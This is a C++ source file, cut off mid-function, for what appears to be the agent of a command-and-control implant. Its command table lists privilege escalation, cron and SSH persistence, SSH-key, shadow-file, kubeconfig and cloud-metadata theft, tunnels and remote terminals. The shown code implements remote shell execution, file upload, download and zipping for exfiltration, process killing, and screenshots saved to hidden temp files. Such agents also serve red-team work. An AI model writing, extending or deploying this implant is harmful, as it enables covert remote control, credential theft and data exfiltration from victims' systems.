#include "agent.hpp"
#include "miniz.h"
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <dirent.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <cstdlib>
#include <pwd.h>
#include <grp.h>
#include <signal.h>
#include <time.h>
#include <cstdio>
#include <cstring>
#include <cerrno>
#include <algorithm>
#include <cctype>
#include <atomic>
#include <mutex>
#include <sstream>
#include <fstream>
#include <filesystem>
#include <climits>

// Command codes
enum : uint32_t {
    CMD_ERROR=0, CMD_PWD=1, CMD_CD=2, CMD_SHELL=3, CMD_EXIT=4, CMD_DOWNLOAD=5,
    CMD_UPLOAD=6, CMD_CAT=7, CMD_CP=8, CMD_MV=9, CMD_MKDIR=10, CMD_RM=11,
    CMD_LS=12, CMD_PS=13, CMD_KILL=14, CMD_ZIP=15, CMD_SCREENSHOT=16, CMD_RUN=17,
    CMD_TUNNEL_START=31, CMD_TUNNEL_STOP=32, CMD_TUNNEL_PAUSE=33, CMD_TUNNEL_RESUME=34,
    CMD_TERMINAL_START=35, CMD_TERMINAL_STOP=36, CMD_TERMINAL_WRITE=37,
    CMD_TUNNEL_WRITE=40, CMD_TUNNEL_REVERSE=41, CMD_TUNNEL_ACCEPT=42,
    CMD_TUNNEL_START_UDP=43, CMD_TUNNEL_WRITE_UDP=44,
    CMD_SYSINFO=200, CMD_ENV=201, CMD_NETWORK=202, CMD_USERS=203, CMD_CRON=204,
    CMD_SSH_KEYS=205, CMD_HISTORY=206, CMD_DOCKER=207, CMD_SERVICES=208,
    CMD_PRIVESC=209, CMD_MOUNTS=210, CMD_PERSIST_CRON=211, CMD_PERSIST_SSH=212,
    CMD_GETUID=213, CMD_FILESEARCH=214, CMD_SSHAGENT=215, CMD_KUBECONFIG=216,
    CMD_CLOUDMETA=217, CMD_SLEEP=220, CMD_WHOAMI=221, CMD_HOSTNAME=222,
    CMD_LSOF=223, CMD_IPTABLES=224, CMD_LAST=225, CMD_SHADOW=226
};

bool ACTIVE=true;
int sleep_sec=10;
int sleep_jit=0;

static std::string errstr(int e){ return std::string(strerror(e)); }

static std::string sh_q(const std::string& s);

static const size_t MAX_COMMAND_OUTPUT = 16ULL * 1024ULL * 1024ULL;
static const size_t MAX_TUNNEL_QUEUE = 4ULL * 1024ULL * 1024ULL;
static const size_t MAX_TERMINAL_QUEUE = 2ULL * 1024ULL * 1024ULL;
static const size_t MAX_TUNNELS = 256;
static const size_t MAX_TERMINALS = 32;

static void append_limited(std::string& out, const char* p, size_t n, bool& truncated){
    if(out.size() >= MAX_COMMAND_OUTPUT){ truncated = true; return; }
    size_t room = MAX_COMMAND_OUTPUT - out.size();
    if(n > room){ out.append(p, room); truncated = true; }
    else out.append(p, n);
}

static bool set_nonblock(int fd){
    int fl=fcntl(fd,F_GETFL,0);
    if(fl<0) return false;
    return fcntl(fd,F_SETFL,fl|O_NONBLOCK)==0;
}

static void close_extra_fds(){
#ifdef SYS_close_range
    if(::syscall(SYS_close_range, 3u, ~0u, 0u)==0) return;
#endif
    DIR* d=::opendir("/proc/self/fd");
    if(d){
        std::vector<int> fds;
        struct dirent* e;
        while((e=::readdir(d))){
            int fd=atoi(e->d_name);
            if(fd>=3) fds.push_back(fd);
        }
        ::closedir(d);
        for(int fd : fds) ::close(fd);
        return;
    }
    long max=sysconf(_SC_OPEN_MAX);
    if(max<0 || max>1048576L) max=1048576L;
    for(int fd=3; fd<(int)max; ++fd) ::close(fd);
}

static void redirect_stdin_devnull(){
    int fd=::open("/dev/null", O_RDONLY | O_CLOEXEC);
    if(fd<0) return;
    ::dup2(fd, STDIN_FILENO);
    if(fd>2) ::close(fd);
}

static int move_fd_above(int fd, int minfd=3){
    if(fd < minfd){
        int nfd = ::fcntl(fd, F_DUPFD_CLOEXEC, minfd);
        if(nfd < 0) return -1;
        ::close(fd);
        return nfd;
    }
    return fd;
}

static bool dup2_retry(int oldfd, int newfd){
    for(;;){
        if(::dup2(oldfd,newfd) >= 0) return true;
        if(errno == EINTR) continue;
        return false;
    }
}

static void child_attach_pipe_to_stdout_stderr(int& rd, int& wr){
    rd = move_fd_above(rd);
    wr = move_fd_above(wr);
    if(rd < 3 || wr < 3 ||
       !dup2_retry(wr, STDOUT_FILENO) ||
       !dup2_retry(wr, STDERR_FILENO)){
        _exit(126);
    }
    ::close(wr);
    ::close(rd);
    redirect_stdin_devnull();
    close_extra_fds();
}

static bool drain_read_fd(int fd, std::string& out, bool& truncated, bool& eof){
    if(out.size() >= MAX_COMMAND_OUTPUT){ truncated=true; return true; }
    char buf[8192];
    for(;;){
        ssize_t n=read(fd,buf,sizeof(buf));
        if(n>0){ append_limited(out,buf,(size_t)n,truncated); continue; }
        if(n==0){ eof=true; return true; }
        if(errno==EINTR) continue;
        if(errno==EAGAIN || errno==EWOULDBLOCK) return true;
        return false;
    }
}

static void kill_child_process(pid_t pid){
    if(kill(-pid,SIGKILL)==0) return;
    if(errno==ESRCH || errno==EPERM) kill(pid,SIGKILL);
}

static std::string run_shell(const std::string& cmd, int timeout_sec=60){
    int fd[2]; if(pipe(fd)!=0) return "";
    pid_t pid=fork();
    if(pid==0){
        setpgid(0,0);
        child_attach_pipe_to_stdout_stderr(fd[0], fd[1]);
        execl("/bin/sh","sh","-c",cmd.c_str(),(char*)nullptr);
        _exit(127);
    }
    if(pid<0){ close(fd[0]); close(fd[1]); return ""; }
    close(fd[1]);
    if(!set_nonblock(fd[0])){ kill_child_process(pid); close(fd[0]); while(waitpid(pid,nullptr,0)<0 && errno==EINTR){} return ""; }
    std::string out; bool truncated=false, eof=false, read_ok=true;
    struct pollfd pfd{fd[0],POLLIN|POLLHUP,0};
    int ms=timeout_sec*1000;
    while(ms>0 && !eof){
        int pr=poll(&pfd,1,200);
        if(pr>0){
            if(!drain_read_fd(fd[0],out,truncated,eof)){ read_ok=false; break; }
        } else if(pr<0){
            if(errno==EINTR) continue;
            read_ok=false; break;
        }
        ms-=200;
    }
    if(!eof || !read_ok) kill_child_process(pid);
    close(fd[0]);
    while(waitpid(pid,nullptr,0)<0 && errno==EINTR){}
    if(truncated) out += "\n[output truncated]";
    return out;
}

static bool fd_send_all(int fd, const uint8_t* p, size_t n){
    while(n>0){
        ssize_t w=send(fd,p,n,MSG_NOSIGNAL);
        if(w<0 && errno==EINTR) continue;
        if(w<=0) return false;
        p+=w; n-=(size_t)w;
    }
    return true;
}

static bool fd_write_all(int fd, const uint8_t* p, size_t n){
    while(n>0){
        ssize_t w=write(fd,p,n);
        if(w<0 && errno==EINTR) continue;
        if(w<=0) return false;
        p+=w; n-=(size_t)w;
    }
    return true;
}

static bool send_nonblock_partial(int fd, const uint8_t* p, size_t n, size_t& sent){
    sent=0;
    while(sent<n){
        ssize_t w=send(fd,p+sent,n-sent,MSG_NOSIGNAL);
        if(w>0){ sent += (size_t)w; continue; }
        if(w<0 && errno==EINTR) continue;
        return false;
    }
    return true;
}

static bool write_nonblock_partial(int fd, const uint8_t* p, size_t n, size_t& sent){
    sent=0;
    while(sent<n){
        ssize_t w=write(fd,p+sent,n-sent);
        if(w>0){ sent += (size_t)w; continue; }
        if(w<0 && errno==EINTR) continue;
        return false;
    }
    return true;
}

std::string sh_q(const std::string& s){
    std::string o="'";
    for(char c:s){ if(c=='\'') o+="'\\''"; else o+=c; }
    o+="'"; return o;
}

static bool split_host_port(const std::string& addr, std::string& host, std::string& port, const std::string& defport="80"){
    if(addr.size()>=2 && addr[0]=='['){
        auto close=addr.find(']');
        if(close==std::string::npos) return false;
        host=addr.substr(1,close-1);
        if(close+1<addr.size() && addr[close+1]==':') port=addr.substr(close+2);
        else port=defport;
    } else {
        auto pos=addr.rfind(':');
        if(pos==std::string::npos){ host=addr; port=defport; }
        else { host=addr.substr(0,pos); port=addr.substr(pos+1); }
    }
    if(host.empty() || port.empty()) return false;
    char* end=nullptr; errno=0;
    long pvl=strtol(port.c_str(),&end,10);
    if(errno!=0 || end==port.c_str() || *end!='\0') return false;
    int pv=(int)pvl;
    if(pv<1 || pv>65535) return false;
    return true;
}

static std::string normpath(const std::string& p){
    if(p.empty()) return ".";
    char* r=realpath(p.c_str(),nullptr);
    if(r){ std::string out(r); free(r); return out; }
    std::string path=p;
    if(path[0]!='/'){
        char cwd[4096];
        if(getcwd(cwd,sizeof(cwd))) path=std::string(cwd)+"/"+path;
    }
    std::vector<std::string> parts;
    std::istringstream ss(path); std::string seg;
    while(std::getline(ss,seg,'/')){
        if(seg.empty()||seg==".") continue;
        if(seg==".."){
            if(!parts.empty()) parts.pop_back();
        } else parts.push_back(seg);
    }
    std::string out="/";
    for(size_t i=0;i<parts.size();i++){ if(i) out+="/"; out+=parts[i]; }
    return out;
}

static bytes err_answer(const std::string& e){
    return mp_map({{"error", mp_str(e)}});
}

static bytes generic_answer(const std::string& out){
    return mp_map({{"output", mp_str(out)}});
}

// ---------------------------------------------------------------------
// Basic commands
// ---------------------------------------------------------------------
static bytes task_pwd(){ char cwd[4096]; if(!getcwd(cwd,sizeof(cwd))) return err_answer(errstr(errno)); return mp_map({{"path", mp_str(cwd)}}); }

static bytes task_cd(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string path=".";
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="path") path=r.read_str(); else r.skip_value(); }
    std::string p=normpath(path);
    if(chdir(p.c_str())!=0) return err_answer(errstr(errno));
    char cwd[4096]; if(!getcwd(cwd,sizeof(cwd))) return err_answer(errstr(errno)); return mp_map({{"path", mp_str(cwd)}});
}

struct ExecResult { std::string output; int status; pid_t pid; };

static ExecResult exec_argv_timeout(const std::string& program, const std::vector<std::string>& argv, int timeout_sec=30){
    int fd[2]; if(pipe(fd)!=0) return {"",-1,-1};
    pid_t pid=fork();
    if(pid==0){
        setpgid(0,0);
        child_attach_pipe_to_stdout_stderr(fd[0], fd[1]);
        std::vector<char*> args;
        args.reserve(argv.size()+2);
        args.push_back(const_cast<char*>(program.c_str()));
        for(auto& a:argv) args.push_back(const_cast<char*>(a.c_str()));
        args.push_back(nullptr);
        execvp(program.c_str(), args.data());
        _exit(127);
    }
    if(pid<0){ close(fd[0]); close(fd[1]); return {"",-1,-1}; }
    close(fd[1]);
    if(!set_nonblock(fd[0])){ kill_child_process(pid); close(fd[0]); int st=0; while(waitpid(pid,&st,0)<0 && errno==EINTR){} return {"",124,pid}; }
    std::string out; bool truncated=false, eof=false, read_ok=true;
    struct pollfd pfd{fd[0],POLLIN|POLLHUP,0};
    int ms=timeout_sec*1000;
    while(ms>0 && !eof){
        int pr=poll(&pfd,1,200);
        if(pr>0){
            if(!drain_read_fd(fd[0],out,truncated,eof)){ read_ok=false; break; }
        } else if(pr<0){
            if(errno==EINTR) continue;
            read_ok=false; break;
        }
        ms-=200;
    }
    bool finished=eof && read_ok;
    if(!finished) kill_child_process(pid);
    close(fd[0]);
    int status=0;
    pid_t waited=0;
    while((waited=waitpid(pid,&status,0))<0 && errno==EINTR){}
    int exit_status=127;
    if(waited==pid){
        if(!finished) exit_status=124;
        else if(WIFEXITED(status)) exit_status=WEXITSTATUS(status);
        else if(WIFSIGNALED(status)) exit_status=128+WTERMSIG(status);
        else exit_status=0;
    }
    if(truncated) out += "\n[output truncated]";
    return {out, exit_status, pid};
}

static std::vector<std::string> parse_args(MpReader& r, uint32_t m){
    std::vector<std::string> out; out.reserve(m);
    for(uint32_t j=0;j<m;j++) out.push_back(r.read_str());
    return out;
}

static std::vector<std::string> parse_args_optional(MpReader& r){
    // msgpack/v5 encodes an empty []string as nil (0xc0), not as an array.
    // Accept both forms so shell/run commands without arguments work.
    if(r.peek()==0xc0){ r.skip(); return {}; }
    uint32_t m=r.read_array();
    return parse_args(r,m);
}

static bytes task_shell(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string program="/bin/bash"; std::vector<std::string> args;
    for(uint32_t i=0;i<n;i++){
        std::string k=r.read_str();
        if(k=="program") program=r.read_str();
        else if(k=="args"){ args=parse_args_optional(r); }
        else r.skip_value();
    }
    auto res=exec_argv_timeout(program,args,30);
    return mp_map({{"output", mp_str(res.output)}});
}

static bytes task_run(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string program; std::vector<std::string> args;
    for(uint32_t i=0;i<n;i++){
        std::string k=r.read_str();
        if(k=="program") program=r.read_str();
        else if(k=="args"){ args=parse_args_optional(r); }
        else r.skip_value();
    }
    auto res=exec_argv_timeout(program,args,30);
    return mp_map({{"stdout", mp_str(res.output)}, {"stderr", mp_str("")}, {"pid", mp_i64(res.pid)}, {"start", mp_bool(true)}, {"finish", mp_bool(true)}});
}

static bytes task_exit(){ ACTIVE=false; return bytes{}; }

static bytes task_cat(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string path;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="path") path=r.read_str(); else r.skip_value(); }
    path=normpath(path);
    int fd=open(path.c_str(), O_RDONLY|O_CLOEXEC|O_NONBLOCK);
    if(fd<0) return err_answer(errstr(errno));
    struct stat st;
    if(fstat(fd,&st)!=0){ int e=errno; close(fd); return err_answer(errstr(e)); }
    if(!S_ISREG(st.st_mode)){ close(fd); return err_answer("not a regular file"); }
    const size_t MAX_CAT=0x100000;
    bytes buf(MAX_CAT);
    size_t total=0;
    while(total<MAX_CAT){
        ssize_t got=read(fd, buf.data()+total, MAX_CAT-total);
        if(got>0){ total += (size_t)got; continue; }
        if(got==0) break;
        if(errno==EINTR) continue;
        int e=errno; close(fd); return err_answer(errstr(e));
    }
    close(fd);
    buf.resize(total);
    return mp_map({{"path",mp_str(path)},{"content",mp_bin(buf)}});
}

static bool path_is_inside(const std::string& parent, const std::string& child){
    if(parent==child) return true;
    return child.size()>parent.size() && child.compare(0,parent.size(),parent)==0 && child[parent.size()]=='/';
}

static bool copy_file(const std::string& src, const std::string& dst){
    std::error_code ec;
    if(std::filesystem::is_symlink(src,ec)){
        auto target=std::filesystem::read_symlink(src,ec);
        if(ec) return false;
        std::filesystem::create_symlink(target,dst,ec);
        return !ec;
    }
    std::filesystem::copy_file(src,dst,std::filesystem::copy_options::overwrite_existing,ec);
    return !ec;
}
static bool copy_dir(const std::string& src, const std::string& dst){
    std::error_code ec;
    std::filesystem::copy(src, dst,
        std::filesystem::copy_options::recursive |
        std::filesystem::copy_options::overwrite_existing |
        std::filesystem::copy_options::copy_symlinks, ec);
    return !ec;
}

static bytes task_cp(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string src,dst;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="src") src=r.read_str(); else if(k=="dst") dst=r.read_str(); else r.skip_value(); }
    src=normpath(src); dst=normpath(dst);
    struct stat st; if(stat(src.c_str(),&st)!=0) return err_answer(errstr(errno));
    if(S_ISDIR(st.st_mode) && path_is_inside(src,dst)) return err_answer("cannot copy directory into itself");
    bool ok=S_ISDIR(st.st_mode)?copy_dir(src,dst):copy_file(src,dst);
    if(!ok) return err_answer("copy failed");
    return bytes{};
}

static bytes task_mv(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string src,dst;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="src") src=r.read_str(); else if(k=="dst") dst=r.read_str(); else r.skip_value(); }
    src=normpath(src); dst=normpath(dst);
    if(rename(src.c_str(),dst.c_str())!=0){
        struct stat st; if(stat(src.c_str(),&st)!=0) return err_answer(errstr(errno));
        if(S_ISDIR(st.st_mode) && path_is_inside(src,dst)) return err_answer("cannot move directory into itself");
        bool ok=S_ISDIR(st.st_mode)?copy_dir(src,dst):copy_file(src,dst);
        if(ok){ std::error_code ec; std::filesystem::remove_all(src, ec); ok=!ec; }
        if(!ok) return err_answer("mv failed");
    }
    return bytes{};
}

static bytes task_mkdir(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string path;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="path") path=r.read_str(); else r.skip_value(); }
    path=normpath(path);
    std::error_code ec; std::filesystem::create_directories(path, ec);
    if(ec) return err_answer(ec.message());
    return bytes{};
}

static bytes task_rm(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string path;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="path") path=r.read_str(); else r.skip_value(); }
    path=normpath(path);
    std::error_code ec; std::filesystem::remove_all(path, ec);
    if(ec) return err_answer(ec.message());
    return bytes{};
}

static std::string mode_string(mode_t m){
    std::string o="----------";
    if(S_ISDIR(m)) o[0]='d';
    else if(S_ISLNK(m)) o[0]='l';
    else if(S_ISBLK(m)) o[0]='b';
    else if(S_ISCHR(m)) o[0]='c';
    else if(S_ISFIFO(m)) o[0]='p';
    else if(S_ISSOCK(m)) o[0]='s';
    if(m & S_IRUSR) o[1]='r';
    if(m & S_IWUSR) o[2]='w';
    if(m & S_IXUSR) o[3]='x';
    if(m & S_IRGRP) o[4]='r';
    if(m & S_IWGRP) o[5]='w';
    if(m & S_IXGRP) o[6]='x';
    if(m & S_IROTH) o[7]='r';
    if(m & S_IWOTH) o[8]='w';
    if(m & S_IXOTH) o[9]='x';
    if(m & S_ISUID) o[3]=(o[3]=='x')?'s':'S';
    if(m & S_ISGID) o[6]=(o[6]=='x')?'s':'S';
    if(m & S_ISVTX) o[9]=(o[9]=='x')?'t':'T';
    return o;
}

static std::map<uid_t,std::string> uid_cache;
static std::map<gid_t,std::string> gid_cache;

static std::string uid_name(uid_t uid){
    auto it=uid_cache.find(uid); if(it!=uid_cache.end()) return it->second;
    char buf[256]; struct passwd pwd, *res=nullptr;
    std::string n;
    if(getpwuid_r(uid,&pwd,buf,sizeof(buf),&res)==0 && res) n=res->pw_name;
    else n=std::to_string(uid);
    uid_cache[uid]=n; return n;
}
static std::string gid_name(gid_t gid){
    auto it=gid_cache.find(gid); if(it!=gid_cache.end()) return it->second;
    char buf[256]; struct group grp, *res=nullptr;
    std::string n;
    if(getgrgid_r(gid,&grp,buf,sizeof(buf),&res)==0 && res) n=res->gr_name;
    else n=std::to_string(gid);
    gid_cache[gid]=n; return n;
}

static bytes task_ls(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string path;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="path") path=r.read_str(); else r.skip_value(); }
    if(path.empty()){ char cwd[4096]; if(!getcwd(cwd,sizeof(cwd))) return err_answer(errstr(errno)); path=cwd; } else path=normpath(path);
    DIR* d=opendir(path.c_str());
    if(!d) return mp_map({{"result",mp_bool(false)},{"status",mp_str(errstr(errno))},{"path",mp_str(path)},{"files",mp_bin(bytes{})}});
    std::vector<bytes> files;
    struct dirent* e;
    while((e=readdir(d))){
        std::string full=path+"/"+e->d_name; struct stat st;
        if(lstat(full.c_str(),&st)!=0) continue;
        char date[32]="";
        struct tm tmv; if(localtime_r(&st.st_mtime,&tmv)) strftime(date,sizeof(date),"%d/%m/%Y %H:%M:%S",&tmv);
        bytes f=mp_map({
            {"mode",mp_str(mode_string(st.st_mode))},
            {"nlink",mp_i64(st.st_nlink)},
            {"user",mp_str(uid_name(st.st_uid))},
            {"group",mp_str(gid_name(st.st_gid))},
            {"size",mp_i64(st.st_size)},
            {"date",mp_str(date)},
            {"filename",mp_str(e->d_name)},
            {"is_dir",mp_bool(S_ISDIR(st.st_mode))}
        });
        files.push_back(f);
    }
    closedir(d);
    return mp_map({{"result",mp_bool(true)},{"status",mp_str("OK")},{"path",mp_str(path)},{"files",mp_bin(mp_array(files))}});
}

static bool all_digits(const std::string& s){
    return !s.empty() && std::all_of(s.begin(),s.end(),[](unsigned char c){return std::isdigit(c);});
}

static std::string read_file_string(const std::string& path){
    std::ifstream f(path,std::ios::binary); if(!f) return "";
    std::ostringstream ss; ss<<f.rdbuf(); return ss.str();
}

static const size_t MAX_PS_ENTRIES = 200;

static std::vector<bytes> proc_procs(){
    std::vector<bytes> procs;
    DIR* d=opendir("/proc"); if(!d) return procs;
    struct dirent* e;
    while((e=readdir(d))){
        std::string name=e->d_name;
        if(!all_digits(name)) continue;
        std::string statstr=read_file_string("/proc/"+name+"/stat");
        std::istringstream st(statstr);
        int pid=0,ppid=0; char ch=0; std::string comm,state;
        if(!(st>>pid>>ch)) continue;
        std::getline(st,comm,')');
        if(!(st>>state>>ppid)) continue;
        std::string cmd=read_file_string("/proc/"+name+"/cmdline");
        for(auto& c:cmd) if(c=='\0') c=' ';
        if(cmd.empty()) cmd="["+comm+"]";
        if(cmd.size() > 160){ cmd.resize(160); cmd += "..."; }
        std::string ctx;
        struct stat pst; if(stat(("/proc/"+name).c_str(),&pst)==0) ctx=uid_name(pst.st_uid)+":"+gid_name(pst.st_gid);
        procs.push_back(mp_map({{"pid",mp_i64(pid)},{"ppid",mp_i64(ppid)},{"tty",mp_str("?")},{"context",mp_str(ctx)},{"process",mp_str(cmd)}}));
        if(procs.size() >= MAX_PS_ENTRIES) break;
    }
    closedir(d);
    return procs;
}

static std::vector<bytes> ps_procs(){
    std::vector<bytes> procs;
    std::string out=run_shell("ps -eo pid=,ppid=,tty=,user=,comm= --sort=pid 2>/dev/null");
    std::istringstream ss(out); std::string line;
    while(std::getline(ss,line)){
        std::istringstream ls(line); int pid,ppid; std::string tty,user,rest;
        if(!(ls>>pid>>ppid>>tty>>user)) continue;
        std::getline(ls,rest);
        if(!rest.empty()&&rest[0]==' ') rest.erase(0,1);
        if(rest.empty()) rest = "?";
        if(rest.size() > 128){ rest.resize(128); rest += "..."; }
        procs.push_back(mp_map({{"pid",mp_i64(pid)},{"ppid",mp_i64(ppid)},{"tty",mp_str(tty)},{"context",mp_str(user)},{"process",mp_str(rest)}}));
        if(procs.size() >= MAX_PS_ENTRIES) break;
    }
    return procs;
}

static bytes task_ps(){
    std::vector<bytes> procs=proc_procs();
    if(procs.empty()) procs=ps_procs();
    return mp_map({{"result",mp_bool(true)},{"status",mp_str("OK")},{"processes",mp_bin(mp_array(procs))}});
}

static bytes task_kill(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); int64_t pid=0;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="pid") pid=r.read_i64(); else r.skip_value(); }
    if(pid<=0 || pid>INT_MAX) return err_answer("invalid pid");
    if(kill(pid,SIGKILL)!=0) return err_answer(errstr(errno));
    return bytes{};
}

static bool zip_add_file(mz_zip_archive* z, const std::string& path, const std::string& arc){
    return mz_zip_writer_add_file(z, arc.c_str(), path.c_str(), nullptr, 0, MZ_BEST_COMPRESSION) ? true : false;
}

static bytes zip_path_to_bytes(const std::string& src){
    struct stat st;
    if(stat(src.c_str(),&st)!=0) return {};
    mz_zip_archive z;
    memset(&z,0,sizeof(z));
    if(!mz_zip_writer_init_heap(&z,0,0)) return {};
    std::error_code ec;
    size_t added=0;
    if(S_ISDIR(st.st_mode)){
        std::filesystem::path base(src);
        for(std::filesystem::recursive_directory_iterator it(base, std::filesystem::directory_options::skip_permission_denied, ec), end; it!=end; it.increment(ec)){
            if(ec) break;
            std::filesystem::path p=it->path();
            if(std::filesystem::is_symlink(std::filesystem::symlink_status(p,ec))) continue;
            if(std::filesystem::is_regular_file(p,ec)){
                std::string full=p.string();
                std::string rel=std::filesystem::relative(p,base).string();
                if(rel.empty() || rel.find("..")==0) continue;
                if(zip_add_file(&z, full, rel)) added++;
            }
        }
    } else if(std::filesystem::is_regular_file(src,ec) && !std::filesystem::is_symlink(std::filesystem::symlink_status(src,ec))){
        if(zip_add_file(&z, src, std::filesystem::path(src).filename().string())) added++;
    }
    if(added==0){ mz_zip_writer_end(&z); return {}; }
    void* p=nullptr; size_t n=0;
    if(!mz_zip_writer_finalize_heap_archive(&z,&p,&n)){ mz_zip_writer_end(&z); return {}; }
    bytes out((uint8_t*)p,(uint8_t*)p+n);
    free(p);
    mz_zip_writer_end(&z);
    return out;
}

static bool zip_path_to_file(const std::string& src, const std::string& dst){
    struct stat st;
    if(stat(src.c_str(),&st)!=0) return false;
    mz_zip_archive z;
    memset(&z,0,sizeof(z));
    if(!mz_zip_writer_init_file(&z,dst.c_str(),0)) return false;
    std::error_code ec;
    size_t added=0;
    if(S_ISDIR(st.st_mode)){
        std::filesystem::path base(src);
        for(std::filesystem::recursive_directory_iterator it(base, std::filesystem::directory_options::skip_permission_denied, ec), end; it!=end; it.increment(ec)){
            if(ec) break;
            std::filesystem::path p=it->path();
            if(std::filesystem::is_symlink(std::filesystem::symlink_status(p,ec))) continue;
            if(std::filesystem::is_regular_file(p,ec)){
                std::string full=p.string();
                std::string rel=std::filesystem::relative(p,base).string();
                if(rel.empty() || rel.find("..")==0) continue;
                if(zip_add_file(&z, full, rel)) added++;
            }
        }
    } else if(std::filesystem::is_regular_file(src,ec) && !std::filesystem::is_symlink(std::filesystem::symlink_status(src,ec))){
        if(zip_add_file(&z, src, std::filesystem::path(src).filename().string())) added++;
    }
    if(added==0){ mz_zip_writer_end(&z); return false; }
    bool ok = mz_zip_writer_finalize_archive(&z) ? true : false;
    mz_zip_writer_end(&z);
    return ok;
}

static bytes task_zip(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string src,dst;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="src") src=r.read_str(); else if(k=="dst") dst=r.read_str(); else r.skip_value(); }
    src=normpath(src); dst=normpath(dst);
    struct stat st; if(stat(src.c_str(),&st)!=0) return err_answer(errstr(errno));
    if(src==dst) return err_answer("zip source and destination are the same path");
    if(S_ISDIR(st.st_mode) && dst.size()>src.size() && dst.compare(0,src.size(),src)==0 && dst[src.size()]=='/')
        return err_answer("zip destination is inside source directory");
    if(!zip_path_to_file(src,dst)) return err_answer("zip failed");
    return mp_map({{"path",mp_str(dst)}});
}

static std::string make_temp_path(){
    bytes rb; random_bytes(rb,8);
    char hex[17]; for(int i=0;i<8;i++) snprintf(hex+i*2,3,"%02x",rb[i]);
    return std::string("/tmp/.ax_")+hex+".png";
}

static bytes task_screenshot(){
    std::string tmpfile=make_temp_path();
    struct Tool { const char* prog; const char* arg1; };
    Tool tools[] = {
        {"scrot","-o"},
        {"import","-window root"},
        {"gnome-screenshot","-f"},
        {"grim",""}
    };
    for(auto& t:tools){
        std::vector<std::string> args;
        args.push_back(t.prog);
        if(t.arg1 && t.arg1[0]){
            std::istringstream iss(t.arg1); std::string a;
            while(iss>>a) args.push_back(a);
        }
        args.push_back(tmpfile);
        auto res=exec_argv_timeout(t.prog, {args.begin()+1, args.end()}, 10);
        if(res.status==0){
            std::ifstream f(tmpfile,std::ios::binary);
            if(f){ std::ostringstream ss; ss<<f.rdbuf(); std::string str=ss.str(); bytes b(str.begin(),str.end()); unlink(tmpfile.c_str()); return mp_map({{"screens",mp_array({mp_bin(b)})}}); }
        }
        unlink(tmpfile.c_str());
    }
    return err_answer("screenshot failed (no display/capture tool available)");
}

static std::mutex upload_mu;
static std::map<std::string,int> upload_fds;

static bytes task_upload(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string path; bytes content; bool finish=false;
    for(uint32_t i=0;i<n;i++){
        std::string k=r.read_str();
        if(k=="path") path=r.read_str();
        else if(k=="content") content=r.read_bin();
        else if(k=="finish") finish=r.read_bool();
        else r.skip_value();
    }
    path=normpath(path);
    std::error_code ec; std::filesystem::create_directories(std::filesystem::path(path).parent_path(), ec);

    std::lock_guard<std::mutex> lk(upload_mu);
    int fd=-1;
    auto it=upload_fds.find(path);
    bool existed=(it!=upload_fds.end());
    if(existed) fd=it->second;
    else {
        fd=open(path.c_str(), O_WRONLY|O_CREAT|O_TRUNC, 0644);
        if(fd<0) return err_answer(errstr(errno));
    }

    if(!content.empty() && !fd_write_all(fd, content.data(), content.size())){
        int save=errno;
        close(fd);
        if(existed) upload_fds.erase(it);
        return err_answer(errstr(save));
    }

    if(finish){
        close(fd);
        if(existed) upload_fds.erase(it);
    } else if(!existed){
        upload_fds[path]=fd;
    }
    return mp_map({{"path",mp_str(path)}});
}

// ---------------------------------------------------------------------
// Download state
// ---------------------------------------------------------------------
struct DownloadState { uint32_t task_id; std::string path; int fd=-1; int64_t offset=0; int64_t size=0; };
static std::mutex dl_mu;
static std::map<std::string, DownloadState> downloads;

static bytes task_download(uint32_t task_id, const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string path;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="path") path=r.read_str(); else r.skip_value(); }
    path=normpath(path);
    struct stat st; if(stat(path.c_str(),&st)!=0) return err_answer(errstr(errno));
    if(S_ISDIR(st.st_mode)){
        bytes b=zip_path_to_bytes(path);
        if(b.empty()) return err_answer("zip failed");
        return mp_map({{"id",mp_i64(task_id)},{"path",mp_str(path+".zip")},{"size",mp_i64(b.size())},{"content",mp_bin(b)},{"start",mp_bool(true)},{"finish",mp_bool(true)}});
    }
    if(!S_ISREG(st.st_mode)) return err_answer("not a regular file");
    int fd=open(path.c_str(), O_RDONLY|O_CLOEXEC|O_NONBLOCK); if(fd<0) return err_answer(errstr(errno));
    struct stat opened_st;
    if(fstat(fd,&opened_st)!=0){ int e=errno; close(fd); return err_answer(errstr(e)); }
    if(!S_ISREG(opened_st.st_mode)){ close(fd); return err_answer("not a regular file"); }
    st=opened_st;
    const size_t CH=0x100000; bytes buf(CH);
    size_t want=std::min<size_t>(CH, st.st_size>0 ? (size_t)st.st_size : CH);
    size_t total=0;
    while(total<want){
        ssize_t rr=read(fd,buf.data()+total,want-total);
        if(rr<0 && errno==EINTR) continue;
        if(rr<=0) break;
